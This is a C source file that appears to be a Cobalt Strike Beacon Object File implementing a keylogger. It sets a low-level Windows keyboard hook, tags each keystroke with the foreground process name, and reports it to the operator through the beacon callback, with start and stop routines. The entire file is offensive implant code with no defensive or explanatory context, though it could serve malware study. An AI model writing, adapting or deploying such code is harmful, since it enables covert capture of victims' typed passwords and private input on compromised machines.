#include "beacon.h"
#include "bofdefs.h"
#include <windows.h>
#include <stdio.h>

HHOOK hHook = NULL;

LRESULT CALLBACK KeyLoggerProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = pKeyBoard->vkCode;
        char key[16];

        // Get the foreground window and its process name
        HWND hwnd = GetForegroundWindow();
        DWORD pid;
        GetWindowThreadProcessId(hwnd, &pid);
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);

        char processName[MAX_PATH] = "<unknown>";
        if (hProcess) {
            HMODULE hMod;
            DWORD cbNeeded;
            if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
                GetModuleBaseName(hProcess, hMod, processName, sizeof(processName) / sizeof(char));
            }
        }
        CloseHandle(hProcess);

        // Log the key and process name
        BeaconPrintf(CALLBACK_OUTPUT, "[%s] Key: %c\n", processName, vkCode);
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void start_keylogger() {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyLoggerProc, hInstance, 0);
    if (!hHook) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to set hook.");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Keylogger started.");
    // Message loop to keep the hook running
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hHook);
}

void stop_keylogger() {
    UnhookWindowsHookEx(hHook);
    BeaconPrintf(CALLBACK_OUTPUT, "Keylogger stopped.");
}